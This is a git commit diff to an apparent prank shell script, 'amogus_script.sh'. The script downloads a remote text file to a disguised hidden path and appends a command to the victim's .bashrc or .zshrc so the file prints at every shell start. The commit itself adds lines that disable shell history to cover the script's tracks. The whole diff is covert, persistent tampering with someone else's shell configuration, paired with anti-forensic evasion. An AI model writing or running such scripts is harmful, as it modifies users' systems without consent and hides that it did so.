933ecc4833878d44e6a2af02ed2cf8b27c4b98c5
me0w <romain.panno@epitech.eu>
2023-01-27 09:26:31 +0100

    Add amogus_script unset history

--- amogus_script.sh
+++ amogus_script.sh
@@ -4,8 +4,11 @@ TARGETPATH=$HOME/.system.d_file
 
 wget -O $TARGETPATH https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus.txt
 
+unset HISTFILE
+set +o history
+
 if [[ -n "$(echo $SHELL | grep 'zsh')" ]]; then
-    echo -e "\ncat $TARGETPATH" >> ~/.zshrc
+    echo -e "\ncat $TARGETPATH" >> ${ZDOTDIR:-$HOME}/.zshrc
 elif [[ -n "$(echo $SHELL | grep 'bash')" ]]; then
     echo -e "\ncat $TARGETPATH" >> ~/.bashrc
 fi
